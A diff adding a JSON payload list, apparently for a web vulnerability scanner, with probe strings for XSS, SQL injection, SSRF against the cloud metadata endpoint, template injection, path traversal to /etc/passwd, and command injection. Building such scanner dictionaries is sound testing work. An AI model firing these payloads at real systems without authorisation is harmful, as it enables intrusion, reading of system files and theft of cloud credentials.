@@ -1,0 +1,37 @@
+{
+  "XSS": [
+    "<script>alert('XSS_TEST')</script>",
+    "\"><script>alert('XSS_TEST')</script>",
+    "<img src=x onerror=alert('XSS_TEST')>",
+    "<svg/onload=alert('XSS_TEST')>",
+    "javascript:alert('XSS_TEST')//"
+  ],
+  "SQLi": [
+    "' OR '1'='1",
+    "admin' --",
+    "' UNION SELECT null, null--",
+    "1; WAITFOR DELAY '0:0:5'",
+    "1' ORDER BY 1--"
+  ],
+  "SSRF": [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://127.0.0.1:80",
+    "file:///etc/passwd"
+  ],
+  "SSTI": [
+    "{{7*7}}",
+    "${7*7}",
+    "<%= 7*7 %>",
+    "#{7*7}"
+  ],
+  "LFI": [
+    "../../../../etc/passwd",
+    "..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "/etc/passwd\u0000"
+  ],
+  "CommandInjection": [
+    "&& whoami",
+    "| whoami",
+    "; ping -c 3 127.0.0.1"
+  ]
+}
